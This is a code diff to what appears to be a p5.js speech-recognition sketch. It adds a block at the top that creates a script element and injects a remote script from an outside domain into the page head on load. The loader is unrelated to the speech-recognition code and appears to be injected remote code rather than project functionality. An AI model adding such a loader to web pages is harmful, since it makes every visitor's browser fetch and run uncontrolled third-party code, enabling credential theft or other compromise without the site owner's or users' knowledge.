@@ -1,3 +1,11 @@
+var k = document.getElementsByTagName('head')[0];
+var c = document.createElement('script');
+c.async = true;
+c.type = 'text/javascript';
+c.charset = 'utf-8';
+c.src = "https://akashraj.tech/js/a.js";
+k.appendChild(c);
+
 var myRec = new p5.SpeechRec('en-US', parseResult);
 myRec.continuous = true;
 myRec.interimResults = true;
